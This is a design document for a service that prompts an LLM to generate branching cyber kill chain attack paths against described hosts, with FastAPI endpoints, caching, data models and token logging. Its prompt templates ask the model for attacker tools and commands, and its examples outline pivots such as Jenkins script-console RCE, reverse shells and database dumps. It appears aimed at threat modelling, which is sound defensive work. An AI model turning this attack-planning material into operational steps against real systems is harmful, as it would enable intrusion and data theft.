# Attack Path Bifurcation Strategy

**Document Version:** 2.0  
**Date:** January 2025  
**Status:** Server-Side Caching + Progress Tracking Architecture  
**Development Approach:** AI-Copilot Assisted Implementation

---

## Executive Summary

This document outlines the strategy for implementing **attack path bifurcation analysis** - a feature that identifies alternative attack paths (branches) from intermediate stages of an existing cyber kill chain attack path.

**Core Innovation:** Server-side request caching architecture that eliminates LLM data duplication while maintaining full context across primary path generation, bifurcation detection, and branch generation.

**Key Features:**
- **Single Complete Endpoint:** `/attack-path/complete` - production-ready endpoint that orchestrates all three analysis phases internally
- **Server-Side Caching:** Host parameters and intermediate results cached in-memory to prevent duplicate LLM calls
- **Progress Tracking:** Terminal progress bar (tqdm) provides real-time visibility during multi-phase analysis (~23+ seconds)
- **Zero Data Duplication:** LLM receives formatted prompts built from cached data, never receives raw host params multiple times
- **Hybrid Architecture:** Granular endpoints (`/attack-path`, `/attack-path/bifurcations`, `/attack-path/bifurcations/{idx}/branches/{id}`) remain available for testing, debugging, and power users

**Architecture Pattern:**
```
Frontend → Backend → AI Service (with server-side cache + progress bar) → LLM Provider
```

**Production Workflow:**
1. Backend sends host parameters ONCE to `/attack-path/complete`
2. AI Service caches host params + intermediate results internally
3. Progress bar shows real-time status in service terminal
4. Backend receives complete formatted result (primary path + bifurcations + branches)
5. No duplicate data sent to LLM, no client-side orchestration needed

---

## Table of Contents

1. [Core Concept](#core-concept)
2. [Current State vs Future State](#current-state-vs-future-state)
3. [Bifurcation Logic](#bifurcation-logic)
4. [Technical Approach](#technical-approach)
5. [Server-Side Caching Strategy](#server-side-caching-strategy)
6. [Data Models](#data-models)
7. [LLM Prompting Strategy](#llm-prompting-strategy)
8. [API Design](#api-design)
9. [Progress Tracking](#progress-tracking)
10. [Token Tracking Strategy](#token-tracking-strategy)
11. [Implementation Phases](#implementation-phases)
12. [Cost and Performance Considerations](#cost-and-performance-considerations)
13. [Response Examples](#response-examples)
14. [Use Cases](#use-cases)

---

## Core Concept

### What is Attack Path Bifurcation?

**Bifurcation** = A point in an attack path where multiple alternative continuation paths exist based on the attacker's gained access, capabilities, and available targets.

### Key Principles

1. **Start with primary path**: Generate one complete attack path through all cyber kill chain stages
2. **Context-aware analysis**: At each stage, consider what the attacker has gained (access, credentials, network position)
3. **Identify alternatives**: Find other techniques/targets available from that position
4. **Generate continuations**: Create full continuation paths from each bifurcation point
5. **Probabilistic ranking**: Include lower-probability branches for comprehensive coverage

### Not Multiple Entry Points

❌ **This is NOT:**
```
Path A: Start → Docker → Root
Path B: Start → SQL Injection → Root
Path C: Start → SSH → Root
```

✅ **This IS:**
```
Primary: [1→2→3→4→5→6→7]

Bifurcation at Stage 3:
├─ Branch A: [3→4a→5a→6a→7a]
└─ Branch B: [3→4b→5b→6b→7b]

Bifurcation at Stage 5:
└─ Branch C: [5→6c→7c]
```

---

## Current State vs Future State

### Current Implementation ✅

**What We Have:**
- Single linear attack path generation
- 50+ optional input parameters
- Dynamic prompt building
- LLM-based path generation
- Structured response (attack path only)

**Example Output:**
```json
{
  "attack_path": [
    "Reconnaissance: Port scanning reveals exposed services and potential entry points",
    "Weaponization: Prepare exploit for identified vulnerability",
    "Delivery: Direct connection to vulnerable service",
    "Exploitation: Execute exploit to gain initial access",
    "Installation: Establish persistence mechanism",
    "Command and Control: Set up communication channel",
    "Actions on Objectives: Complete mission objectives"
  ]
}
```

### Future State 🎯

**What We'll Add:**
- Bifurcation detection at each stage
- Alternative path generation from decision points
- Branch probability scoring
- Attack graph visualization
- Comprehensive coverage of attack possibilities

**Example Enhanced Output:**
```json
{
  "primary_path": [/* 7 stages */],
  "bifurcations": [
    {
      "stage_index": 3,
      "stage_name": "Execution",
      "decision_point": "Attacker has Docker container access",
      "available_alternatives": 3,
      "branches": [
        {
          "branch_id": "B1",
          "probability": "medium",
          "continuation_path": [/* stages 4-7 */]
        }
      ]
    }
  ],
  "total_paths": 5,
  "attack_graph": {/* graph structure */}
}
```

---

## Bifurcation Logic

### When Does a Bifurcation Occur?

A bifurcation exists at stage N when:

1. **Multiple targets available** from current position
   - Example: "From web server, can reach database OR Jenkins OR internal network"

2. **Multiple techniques possible** for next kill chain stage
   - Example: "For privilege escalation, can exploit kernel OR sudo misconfiguration OR weak passwords"

3. **Context enables alternatives** based on what attacker gained
   - Example: "After compromising Docker, attacker can see Jenkins credentials in environment variables"

4. **Lower-probability but viable paths** exist
   - Example: "Primary: container escape (80% success). Alternative: exploit Jenkins from container (40% success)"

### Bifurcation Criteria

**Must have ALL of:**
- ✅ Attacker has gained access/capabilities at this stage
- ✅ System has multiple exploitable elements visible from this position
- ✅ Alternative techniques align with remaining kill chain stages
- ✅ Alternative path is technically feasible (even if lower probability)

**Examples from `example_request_enhanced.json`:**

**Stage 3 Bifurcation (After Docker Access):**
- **Context**: Attacker has container access, can see internal network
- **Alternative 1**: Continue with container escape (original path)
- **Alternative 2**: Pivot to Jenkins (visible on network, unauthenticated)
- **Alternative 3**: Pivot to MySQL (accessible with default credentials)

**Stage 5 Bifurcation (After Initial Persistence):**
- **Context**: Attacker has low-privilege persistence
- **Alternative 1**: Escalate via kernel exploit (original path)
- **Alternative 2**: Escalate via sudo misconfiguration
- **Alternative 3**: Escalate via service account hijacking

---

## Technical Approach

### Hybrid Architecture: Granular + Complete Endpoints

**Core Philosophy:** Provide both granular control (3 independent endpoints) and production convenience (single complete endpoint with server-side caching).

**Why Hybrid:**
- **Granular endpoints** enable testing, debugging, and power-user workflows
- **Complete endpoint** provides optimal production performance with caching
- **Backend simplicity** - one request with all results
- **Zero data duplication** - server caches internally, never sends duplicate data to LLM

---

### Architecture Overview

```
Frontend → Backend → AI Service → LLM Provider
                      (caching)
                      (progress)
```

**Key Innovation:** Server-side request cache eliminates duplicate data transmission to LLM while maintaining full context.

---

#### **Endpoint 1: `/attack-path` (Primary Path - Existing)**
*Existing endpoint - UNCHANGED*

```
Input: Host parameters (50+ fields)
Process: Build dynamic prompt → Call LLM → Parse response
Output: {"attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...]}
```

**Status:** Already implemented and production-ready. **No modifications required.**

**Response Time:** 5-15 seconds  
**Cost:** ~$0.01-0.03 per request

**Use Case:** Testing, debugging, clients who only need primary path

---

#### **Service 2: `/attack-path/bifurcations` (Bifurcation Detection)**
*New endpoint - lightweight analysis to detect decision points*

**Input Structure:**
```json
{
  "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...],
  "host": {
    // ALL 50+ optional parameters - same InputHost as sent to Service 1
    "platform": "Linux",
    "version_os": "Ubuntu 20.04",
    "open_ports": [2375, 8080, 3306],
    "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
    "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
    "security_controls": ["fail2ban"],
    "mfa_enabled": false,
    "admin_accounts": ["root", "admin"],
    "network_segment": "DMZ",
    "internet_exposed": true,
    "asset_criticality": "Critical",
    "edr_agent": "None",
    "configurations": ["Docker API exposed without TLS authentication"],
    "password_policy": "Weak - 8 character minimum",
    "installed_software": ["Jenkins 2.346.1", "MySQL 5.7.33", "Docker 20.10.7"],
    // ... any other parameters from the 50+ available fields
  }
}
```

**Single-Pass Analysis (Bifurcation Detection Only):**

```
Input: Primary attack path from Service 1 + Complete InputHost (all 50+ parameters)
Process: For each stage, analyze attacker context and identify alternatives using full system knowledge
Output: List of bifurcation points with alternative IDs (NO continuation paths generated yet)
```

**Response Time:** 5-10 seconds (1 LLM call)  
**Cost:** ~$0.01-0.02 per request

**Why Full InputHost is Critical:**
- Attack path strings describe what happened, but may not capture all available targets
- 50+ parameters provide complete system context: services, vulnerabilities, security gaps, credentials, network topology
- LLM can identify realistic alternatives by matching attacker capabilities with available attack surface
- Example: Stage shows "container access" → LLM checks host.services for pivot targets, host.vulnerabilities for exploits, host.security_controls for evasion needs

**LLM Prompt Strategy:**
```
System: You are an expert penetration tester analyzing attack paths.

User: Given this attack path and host data, identify decision points 
where the attacker has multiple viable alternatives:

PRIMARY PATH:
Stage 1: Reconnaissance - Port scanning
Stage 2: Initial Access - Exploit Docker API
Stage 3: Execution - Deploy malicious container
Stage 4: Privilege Escalation - Container escape
...

HOST CONTEXT:
- Docker API exposed (port 2375)
- Jenkins unauthenticated (port 8080)
- MySQL with default credentials (port 3306)
...

For each stage, identify:
1. What access/capabilities has the attacker gained?
2. What other targets/techniques are now available?
3. What are viable alternative paths from this point?

Return JSON with bifurcation points.
```

**Expected Response:**
```json
{
  "bifurcations": [
    {
      "stage_index": 3,
      "stage_name": "Execution",
      "attacker_context": "Has Docker container access, can see internal network",
      "decision_point": "Multiple exploitable services visible from container network",
      "alternatives": [
        {
          "id": "B1",
          "reason": "Jenkins visible and unauthenticated",
          "technique": "Pivot to Jenkins exploitation",
          "probability": "high"
        },
        {
          "id": "B2",
          "reason": "MySQL accessible with default creds",
          "technique": "Pivot to database compromise",
          "probability": "medium"
        }
      ]
    }
  ]
}
```

**Note:** The `alternatives` array contains metadata ONLY - no `continuation_path` field yet. Branches are generated on-demand via Service 3.

---

#### **Service 3: `/attack-path/bifurcations/{bifurcation_index}/branches/{branch_id}` (Branch Generation)**
*New endpoint - on-demand generation of specific branch continuation*

**Input Structure:**
```json
{
  "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...],
  "host": {
    // Same complete InputHost with all 50+ parameters
    "platform": "Linux",
    "open_ports": [2375, 8080, 3306],
    "services": [...],
    "vulnerabilities": [...],
    // ... all other fields
  },
  "bifurcation_index": 0,
  "branch_id": "B1"
}
```

**Response Time:** 3-5 seconds (1 LLM call)  
**Cost:** ~$0.005-0.01 per branch

**Single-Pass Analysis (Branch Generation):**

```
Input: Specific bifurcation point + branch ID + Complete InputHost (50+ params) + Original attack_path for context
Process: Generate realistic continuation for THIS specific branch using full system knowledge
Output: Complete continuation path from bifurcation point to end of kill chain
```

**Note:** Service 3 generates ONE branch at a time, on-demand. Client controls which branches to explore.

**LLM Prompt Strategy (Service 3 - per branch):**
```
System: You are an expert penetration tester creating attack paths.

User: Generate a continuation attack path from this bifurcation point:

BIFURCATION POINT:
Stage: 3 (Execution)
Attacker Context: Has Docker container access
Alternative Technique: Pivot to Jenkins exploitation

HOST CONTEXT:
- Jenkins 2.346.1 without authentication on /script endpoint
- Docker container has network access to Jenkins
...

Generate the remaining kill chain stages (4-7) following this alternative:
- Stage 4: Privilege Escalation (on Jenkins)
- Stage 5: Persistence
- Stage 6: Lateral Movement
- Stage 7: Exfiltration

Return JSON with complete continuation path.
```

**Expected Response:**
```json
{
  "branch_id": "B1",
  "bifurcation_index": 0,
  "from_stage": 3,
  "continuation_path": [
    "Installation: Jenkins Groovy Script Console RCE to execute arbitrary code via /script endpoint",
    "Command and Control: Establish reverse shell via Jenkins agent connection",
    "Actions on Objectives: Steal CI/CD secrets and source code from Jenkins workspace"
  ]
}
```

---

## Server-Side Caching Strategy

### Problem: Data Duplication Without Caching

**Without server-side caching**, the client must orchestrate three separate API calls:

```text
1. POST /attack-path with InputHost (50+ fields) → Primary path
2. POST /attack-path/bifurcations with InputHost + attack_path → Bifurcations
3. POST /attack-path/bifurcations/{idx}/branches/{id} with InputHost + attack_path → Each branch
```

**Issues:**
- ❌ **LLM data duplication**: Host params sent to LLM 3-4 times (once per service)
- ❌ **Network overhead**: Sending 50+ fields repeatedly across network
- ❌ **Client complexity**: Backend must manage state and orchestrate calls
- ❌ **Cost inefficiency**: Duplicate token usage if LLM processes same data multiple times

### Solution: Server-Side Request Cache

**With server-side caching**, one endpoint handles everything internally:

```python
# In-memory cache structure (Python dict)
request_cache = {
    "request_id": str(uuid.uuid4()),
    "host": InputHost,           # Cached once, reused for all phases
    "attack_path": List[str],    # Cached after Service 1
    "bifurcations": List[...],   # Cached after Service 2
    "branches": Dict[str, ...]   # Cached as each branch is generated
}
```

**Benefits:**
- ✅ **Zero LLM duplication**: Host params cached, formatted prompts built from cache
- ✅ **Single client call**: Backend sends host params ONCE to `/attack-path/complete`
- ✅ **Server-side orchestration**: AI service manages all three phases internally
- ✅ **Cost optimized**: LLM receives only formatted prompts, not duplicate raw data
- ✅ **Progress visibility**: Terminal progress bar shows real-time status

### Caching Workflow

```python
@app.post("/attack-path/complete")
async def generate_complete_attack_path(host: InputHost):
    """
    Complete bifurcation analysis with server-side caching.
    
    Returns:
        {
            "primary_path": [...],
            "bifurcations": [...],
            "branches": {...},
            "request_id": "uuid"
        }
    """
    # Initialize cache
    request_cache = {
        "request_id": str(uuid.uuid4()),
        "host": host,  # CACHED - never sent to LLM again
        "attack_path": None,
        "bifurcations": None,
        "branches": {}
    }
    
    # Phase 1: Generate primary path using cached host data
    primary_result = await analyzer.analyze(request_cache["host"])
    request_cache["attack_path"] = primary_result.attack_path
    
    # Phase 2: Detect bifurcations using cached host + attack_path
    bifurcations_result = await detect_bifurcations(
        attack_path=request_cache["attack_path"],
        host=request_cache["host"]  # Reused from cache
    )
    request_cache["bifurcations"] = bifurcations_result.bifurcations
    
    # Phase 3: Generate branches using cached data
    for bif_idx, bifurcation in enumerate(request_cache["bifurcations"]):
        for alternative in bifurcation.alternatives:
            branch = await generate_branch(
                attack_path=request_cache["attack_path"],  # From cache
                host=request_cache["host"],  # From cache
                bifurcation_index=bif_idx,
                branch_id=alternative.id
            )
            request_cache["branches"][alternative.id] = branch
    
    # Return complete formatted result
    return format_complete_response(request_cache)
```

### Cache Lifecycle

1. **Request Start**: Cache created with unique request_id
2. **Phase 1 (Primary Path)**: Host params cached, attack_path stored
3. **Phase 2 (Bifurcation Detection)**: Uses cached host + attack_path, stores bifurcations
4. **Phase 3 (Branch Generation)**: Uses cached data for each branch, stores branches
5. **Request End**: Cache cleared after response sent (optional: TTL-based cache for retries)

### Data Flow Comparison

**Old Approach (Client Orchestration):**
```text
Client → Service 1 (send host params) → LLM (process host)
Client → Service 2 (send host + path) → LLM (process host again)
Client → Service 3 (send host + path) → LLM (process host again)
```

**New Approach (Server-Side Caching):**
```text
Client → /attack-path/complete (send host params once)
    ├─ Phase 1: Build prompt from host → LLM
    ├─ Phase 2: Build prompt from cached host + path → LLM
    └─ Phase 3: Build prompt from cached data → LLM
Client ← Complete result (primary + bifurcations + branches)
```

### LLM Prompt Strategy with Caching

**Key Insight:** LLM doesn't receive raw host params multiple times. Instead:

```python
# Phase 1: LLM receives formatted prompt
prompt_1 = build_primary_path_prompt(cache["host"])
# "Analyze this Linux Ubuntu 20.04 system with Docker API exposed..."

# Phase 2: LLM receives formatted prompt built from cache
prompt_2 = build_bifurcation_prompt(
    attack_path=cache["attack_path"],
    host_context=summarize_host_for_bifurcation(cache["host"])
)
# "Given primary path [...] and system with [Docker, Jenkins, MySQL], 
#  identify decision points..."

# Phase 3: LLM receives formatted prompt for specific branch
prompt_3 = build_branch_prompt(
    branch_context=get_branch_context(cache, bif_idx, branch_id),
    host_summary=cache["host"].platform + " with " + cache["host"].services
)
# "Generate continuation from Stage 3 (Docker access) targeting Jenkins..."
```

**Result:** Each phase sends **different formatted prompts** to LLM, but all built from **same cached host data**.

---

## Data Models

### Service 1 Models (Existing - UNCHANGED)

```python
class AttackPathResponse(BaseModel):
    """Response from /attack-path endpoint"""
    attack_path: List[str] = Field(description="7-stage attack sequence")
    generated_prompt: Optional[str] = None
    prompt_sections: Optional[int] = None
```

---

### Service 2 Models (NEW)

**File:** `app/models/bifurcation.py`

```python
from typing import List, Optional, Dict
from pydantic import BaseModel, Field


# ============================================
# SERVICE 2: Bifurcation Detection Models
# ============================================

class BifurcationDetectionRequest(BaseModel):
    """Input for Service 2: /attack-path/bifurcations"""
    attack_path: List[str] = Field(
        ...,
        description="The attack path strings from /attack-path endpoint (what the attacker did)"
    )
    host: InputHost = Field(
        ...,
        description="Complete host parameters with ALL 50+ optional fields - exact same InputHost sent to /attack-path. Provides full context about available targets, vulnerabilities, security controls, credentials, network topology, etc."
    )

class AlternativeMetadata(BaseModel):
    """Metadata about an alternative branch (NO continuation path yet)"""
    id: str = Field(description="Unique identifier for this branch (e.g., 'B1', 'B2')")
    technique: str = Field(description="Alternative technique/target")
    reason: str = Field(description="Why this alternative exists")
    probability: str = Field(description="Likelihood: high/medium/low")

class BifurcationPoint(BaseModel):
    """Decision point where attack path can branch (detection only)"""
    stage_index: int = Field(description="Index in primary path where bifurcation occurs (0-based)")
    stage_name: str = Field(description="Name of the kill chain stage")
    attacker_context: str = Field(description="What the attacker has gained at this point")
    decision_point: str = Field(description="Why multiple paths exist here")
    alternatives: List[AlternativeMetadata] = Field(description="Alternative branch metadata (no paths yet)")

class BifurcationDetectionResponse(BaseModel):
    """Response from Service 2: /attack-path/bifurcations"""
    bifurcations: List[BifurcationPoint] = Field(description="Decision points with alternative metadata")


# ============================================
# SERVICE 3: Branch Generation Models
# ============================================

class BranchGenerationRequest(BaseModel):
    """Input for Service 3: /attack-path/bifurcations/{bif_idx}/branches/{branch_id}"""
    attack_path: List[str] = Field(
        ...,
        description="Original attack path for context"
    )
    host: InputHost = Field(
        ...,
        description="Complete host parameters (same as sent to Service 1 and 2)"
    )
    bifurcation_index: int = Field(
        ...,
        description="Index of the bifurcation point in the bifurcations array"
    )
    branch_id: str = Field(
        ...,
        description="The specific branch ID to generate (e.g., 'B1')"
    )

class BranchGenerationResponse(BaseModel):
    """Response from Service 3: generated continuation path for one branch"""
    branch_id: str = Field(description="The branch ID that was generated")
    bifurcation_index: int = Field(description="Index of the bifurcation point")
    from_stage: int = Field(description="Stage index where this branch diverges")
    continuation_path: List[str] = Field(description="Attack path continuation from bifurcation point to end")


# ============================================
# SHARED: Token Tracking (not in responses)
# ============================================

class TokenUsage(BaseModel):
    """Token consumption tracking for a single LLM call (logged only)"""
    prompt_tokens: int = Field(description="Input tokens sent to LLM")
    completion_tokens: int = Field(description="Output tokens received from LLM")
    total_tokens: int = Field(description="Total tokens (prompt + completion)")
    model: str = Field(description="LLM model used")
    response_time_seconds: float = Field(description="Time taken for LLM call")
    cost_estimate_usd: Optional[float] = Field(None, description="Estimated cost in USD")
```

**Note:** Token tracking is logged to `logs/token_usage.jsonl` but NOT included in API responses.

---

## LLM Prompting Strategy

### Service 1: Primary Path (Existing)

**File:** `app/core/prompts.py` - `build_attack_analysis_prompt()`

**No changes needed** - uses existing dynamic prompt builder.

---

### Service 2: Bifurcation Detection (New)

**New Function:** `build_bifurcation_analysis_prompt()`

```python
def build_bifurcation_analysis_prompt(
    primary_path: List[AttackStage], 
    host: InputHost
) -> str:
    """
    Build prompt to identify bifurcation points in existing attack path.
    
    Args:
        primary_path: The generated primary attack path
        host: Original host parameters
        
    Returns:
        Formatted prompt string for bifurcation detection
    """
    
    prompt = f"""You are an expert penetration tester analyzing attack paths.

TASK: Identify decision points (bifurcations) in the following attack path where the attacker 
has multiple viable alternatives based on their gained access and the target system's configuration.

PRIMARY ATTACK PATH:
"""
    
    # Add each stage with index
    for idx, stage in enumerate(primary_path):
        prompt += f"\nStage {idx + 1}: {stage.stage} - {stage.technique}"
        prompt += f"\n  Description: {stage.description}"
    
    prompt += "\n\nTARGET SYSTEM CONTEXT:\n"
    
    # Add relevant host context (similar to existing prompt builder)
    if host.open_ports:
        prompt += f"\nOpen Ports: {', '.join(map(str, host.open_ports))}"
    
    if host.services:
        prompt += f"\nServices:\n"
        for svc in host.services:
            prompt += f"  - {svc}\n"
    
    if host.vulnerabilities:
        prompt += f"\nVulnerabilities:\n"
        for vuln in host.vulnerabilities:
            prompt += f"  - {vuln}\n"
    
    # Add other relevant sections (installed_software, configurations, etc.)
    
    prompt += """

ANALYSIS INSTRUCTIONS:

For each stage in the primary path, determine:

1. **Attacker Context**: What access, credentials, or capabilities has the attacker gained by this stage?

2. **Available Alternatives**: Based on the attacker's context and system configuration, what other 
   targets or techniques are now accessible?

3. **Bifurcation Viability**: Are there multiple viable paths forward? Consider:
   - Other exploitable services visible from attacker's position
   - Alternative techniques for the next kill chain stage
   - Pivot opportunities to other systems
   - Lower-probability but feasible alternatives

4. **Continuation Feasibility**: Can the alternative lead to a complete attack path through 
   remaining kill chain stages?

RETURN FORMAT:

Return a JSON object with this structure:
{
  "bifurcations": [
    {
      "stage_index": <int>,
      "stage_name": "<stage name>",
      "attacker_context": "<what attacker has gained>",
      "decision_point": "<why alternatives exist>",
      "alternatives": [
        {
          "id": "<unique ID like 'B1', 'B2'>",
          "technique": "<alternative technique/target>",
          "reason": "<why this alternative is viable>",
          "probability": "<high|medium|low>"
        }
      ]
    }
  ]
}

Include all viable bifurcations, even lower-probability ones, to provide comprehensive coverage.
If no bifurcations exist, return empty array.
"""
    
    return prompt
```

---

### Service 3: Branch Generation (New)

**New Function:** `build_branch_continuation_prompt()`

```python
def build_branch_continuation_prompt(
    bifurcation: Dict,
    alternative: Dict,
    primary_path: List[AttackStage],
    host: InputHost
) -> str:
    """
    Build prompt to generate continuation path for a specific branch.
    
    Args:
        bifurcation: The bifurcation point data
        alternative: Specific alternative being explored
        primary_path: Original primary path for context
        host: Host parameters
        
    Returns:
        Formatted prompt string for branch generation
    """
    
    stage_idx = bifurcation["stage_index"]
    remaining_stages = ["Privilege Escalation", "Persistence", "Defense Evasion", 
                       "Credential Access", "Discovery", "Lateral Movement", 
                       "Collection", "Exfiltration", "Impact"]
    
    # Determine which stages need to be generated
    completed_stages = [s.stage for s in primary_path[:stage_idx + 1]]
    needed_stages = [s for s in remaining_stages if s not in completed_stages]
    
    prompt = f"""You are an expert penetration tester creating attack paths.

TASK: Generate a continuation attack path from the following bifurcation point.

BIFURCATION CONTEXT:
- Bifurcation occurs at: Stage {stage_idx + 1} ({bifurcation['stage_name']})
- Attacker has: {bifurcation['attacker_context']}
- Alternative technique: {alternative['technique']}
- Reason for alternative: {alternative['reason']}

PRIMARY PATH (for reference):
"""
    
    for idx, stage in enumerate(primary_path):
        marker = ">>> BIFURCATION POINT <<<" if idx == stage_idx else ""
        prompt += f"\nStage {idx + 1}: {stage.stage} - {stage.technique} {marker}"
    
    prompt += f"\n\nALTERNATIVE PATH CONTINUATION:\n"
    prompt += f"Starting from stage {stage_idx + 1}, generate the following stages using the alternative technique:\n"
    
    for i, stage_name in enumerate(needed_stages, start=stage_idx + 2):
        prompt += f"\nStage {i}: {stage_name}"
    
    prompt += "\n\nTARGET SYSTEM CONTEXT:\n"
    
    # Add host context (similar to Pass 2)
    # ... (services, vulnerabilities, configurations)
    
    prompt += f"""

INSTRUCTIONS:

Generate a realistic, detailed continuation path that:
1. Starts from the bifurcation point using the alternative technique
2. Progresses through the remaining cyber kill chain stages
3. Takes into account the attacker's current position and capabilities
4. Uses available vulnerabilities, misconfigurations, and weaknesses
5. Includes specific tools, commands, and indicators of compromise

RETURN FORMAT:

Return a JSON object with this structure:
{{
  "branch_id": "{alternative['id']}",
  "from_stage_index": {stage_idx},
  "continuation_path": [
    {{
      "stage": "<stage name>",
      "technique": "<specific technique>",
      "description": "<detailed description>",
      "mitre_attack_id": "<MITRE ATT&CK ID>",
      "tools": ["<tool1>", "<tool2>"],
      "commands": ["<command1>"],
      "indicators": ["<IOC1>", "<IOC2>"],
      "detection_difficulty": "<low|medium|high>"
    }}
  ]
}}
"""
    
    return prompt
```

---

## Response Structure

### Example Complete Response

```json
{
  "bifurcations": [
    {
      "stage_index": 2,
      "stage_name": "Execution",
      "attacker_context": "Attacker has Docker container access with network visibility",
      "decision_point": "Multiple exploitable services visible from container network",
      "branches": [
        {
          "branch_id": "B1",
          "technique": "Pivot to Jenkins Exploitation",
          "reason": "Jenkins running without authentication on internal network",
          "probability": "high",
          "continuation_path": [
            "Installation: Jenkins Groovy Script Console RCE to execute arbitrary code",
            "Command and Control: Establish reverse shell via Jenkins agent",
            "Actions on Objectives: Steal CI/CD secrets and source code from Jenkins workspace"
          ]
        },
        {
          "branch_id": "B2",
          "technique": "Pivot to MySQL Database",
          "reason": "MySQL accessible with default credentials from container",
          "probability": "medium",
          "continuation_path": [
            "Installation: MySQL UDF code execution to gain OS command access",
            "Command and Control: Setup MySQL-based backdoor for persistence",
            "Actions on Objectives: Dump production database with customer PII"
          ]
        }
      ]
    },
    {
      "stage_index": 4,
      "stage_name": "Installation",
      "attacker_context": "Attacker has root access on host system",
      "decision_point": "Multiple persistence mechanisms available",
      "branches": [
        {
          "branch_id": "B3",
          "technique": "Alternative Persistence via Service Account",
          "reason": "Multiple service accounts with sudo privileges",
          "probability": "medium",
          "continuation_path": [
            "Command and Control: Service account-based C2 channel",
            "Actions on Objectives: Lateral movement using service account credentials"
          ]
        }
      ]
    }
  ]
}
```

**Response Contains:**
- `bifurcations`: Array of decision points with alternative paths
- Each bifurcation includes:
  - Stage information (index, name)
  - Attacker context (what was gained)
  - Decision rationale (why alternatives exist)
  - Alternative branches with continuation paths

**Total Paths Calculation:**
- Primary path: 1
- Branches: 3 (B1, B2, B3)
- **Total: 4 unique attack paths**

---

## Token Tracking Strategy

### Overview

**Token usage is logged locally to a file** - not included in API responses to avoid overhead. This provides comprehensive tracking for cost monitoring and performance analysis without impacting client response payloads.

### Implementation: Local JSON Lines Logging

**Log File Format:** JSON Lines (`.jsonl`) - one JSON object per line

**Location:** `logs/token_usage.jsonl`

**Log Rotation:** 10MB per file, keep 5 backups (50MB total history)

### Token Logger Implementation

**New File:** `app/utils/token_logger.py`

```python
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional
from logging.handlers import RotatingFileHandler

class TokenLogger:
    """
    Logs token usage to local JSON Lines file.
    Each line is a JSON object representing one LLM call.
    """
    
    def __init__(self, log_file: str = "logs/token_usage.jsonl"):
        self.log_file = Path(log_file)
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        
        self.logger = logging.getLogger("token_usage")
        self.logger.setLevel(logging.INFO)
        
        if not self.logger.handlers:
            handler = RotatingFileHandler(
                self.log_file,
                maxBytes=10 * 1024 * 1024,  # 10 MB
                backupCount=5
            )
            handler.setFormatter(logging.Formatter('%(message)s'))
            self.logger.addHandler(handler)
    
    def log_llm_call(
        self,
        request_id: str,
        call_type: str,  # "primary_path", "bifurcation_detection", "branch_B1"
        model: str,
        prompt_tokens: int,
        completion_tokens: int,
        total_tokens: int,
        response_time_seconds: float,
        cost_estimate: Optional[float] = None,
        metadata: Optional[Dict] = None
    ):
        log_entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "request_id": request_id,
            "call_type": call_type,
            "model": model,
            "tokens": {
                "prompt": prompt_tokens,
                "completion": completion_tokens,
                "total": total_tokens
            },
            "response_time_seconds": round(response_time_seconds, 3),
            "cost_estimate_usd": cost_estimate,
            "metadata": metadata or {}
        }
        self.logger.info(json.dumps(log_entry))

# Global instance
token_logger = TokenLogger()
```

### LLM Client Updates

**File:** `app/services/llm_client.py`

```python
import time
from app.utils.token_logger import token_logger

class LLMClient:
    
    async def complete(
        self, 
        system_message: str, 
        user_prompt: str,
        json_mode: bool = True,
        request_id: str = None,  # NEW: for tracking
        call_type: str = "primary_path"  # NEW: categorization
    ) -> Dict[str, Any]:
        start_time = time.time()
        
        # ... existing LLM call code ...
        response = await litellm.acompletion(**request_params)
        
        response_time = time.time() - start_time
        usage = response.usage
        
        # Calculate cost estimate
        cost_estimate = self._calculate_cost(
            model=self.model,
            prompt_tokens=usage.prompt_tokens,
            completion_tokens=usage.completion_tokens
        )
        
        # LOG TOKEN USAGE (local file only)
        token_logger.log_llm_call(
            request_id=request_id or "unknown",
            call_type=call_type,
            model=self.model,
            prompt_tokens=usage.prompt_tokens,
            completion_tokens=usage.completion_tokens,
            total_tokens=usage.total_tokens,
            response_time_seconds=response_time,
            cost_estimate=cost_estimate
        )
        
        # ... existing response parsing ...
    
    def _calculate_cost(self, model: str, prompt_tokens: int, completion_tokens: int) -> float:
        """Estimate cost based on model pricing (as of 2024)"""
        pricing = {
            "gpt-4o-mini": {"input": 0.150, "output": 0.600},
            "gpt-4o": {"input": 2.50, "output": 10.00},
            "claude-3-5-sonnet-20241022": {"input": 3.00, "output": 15.00},
        }
        
        if model not in pricing:
            return None
        
        input_cost = (prompt_tokens / 1_000_000) * pricing[model]["input"]
        output_cost = (completion_tokens / 1_000_000) * pricing[model]["output"]
        
        return round(input_cost + output_cost, 6)
```

### Analyzer Updates

**File:** `app/services/analyzer.py`

```python
import uuid

class AttackPathAnalyzer:
    
    async def analyze_with_bifurcations(self, host: InputHost, include_prompt: bool = True):
        """Three-pass analysis with token tracking"""
        
        # Generate unique request ID for grouping related LLM calls
        request_id = str(uuid.uuid4())
        
        # Pass 1: Primary path
        primary_result = await self.analyze(host, include_prompt)
        
        # Pass 2: Bifurcation detection
        bifurcations_data = await self.llm_client.complete(
            system_message="...",
            user_prompt=bifurcation_prompt,
            json_mode=True,
            request_id=request_id,
            call_type="bifurcation_detection"
        )
        
        # Pass 3: Generate each branch
        for bifurcation in bifurcations_data.get("bifurcations", []):
            for alt in bifurcation.get("alternatives", []):
                branch_data = await self.llm_client.complete(
                    system_message="...",
                    user_prompt=branch_prompt,
                    json_mode=True,
                    request_id=request_id,
                    call_type=f"branch_{alt['id']}"  # e.g., "branch_B1"
                )
                # ... process branch ...
        
        # Token usage logged automatically - not in response
        return enhanced_response
```

### Example Log Output

**File:** `logs/token_usage.jsonl`

```json
{"timestamp": "2025-10-16T14:32:15.234Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "primary_path", "model": "gpt-4o-mini", "tokens": {"prompt": 3200, "completion": 1800, "total": 5000}, "response_time_seconds": 4.521, "cost_estimate_usd": 0.00156, "metadata": {}}
